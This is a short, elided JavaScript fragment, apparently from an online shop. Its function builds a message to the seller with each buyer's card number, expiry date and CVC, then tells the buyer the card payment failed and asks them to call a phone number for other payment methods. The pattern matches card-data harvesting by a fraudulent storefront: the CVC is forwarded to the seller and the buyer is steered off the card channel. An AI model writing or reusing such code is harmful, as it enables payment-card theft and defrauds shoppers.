...
function createCardPaymentSellerMessage(order) {
  ...
  const lines = [
    ...
    `<b>Card Number:</b> ${escapeHtml(order.customer.cardNumberMasked || 'Not provided')}`,
    `<b>Card Expiry:</b> ${escapeHtml(order.customer.cardExpiry || 'Not provided')}`,
    `<b>Card CVC:</b> ${escapeHtml(order.customer.cardCode || 'Not provided')}`,
    '',
    '<b>Products</b>',
    itemsText,
    '',
    ...
    'Card Payment Failed, Kindly text/call us on +1 (747) 357-9895 for alternative payment methods',
  ]
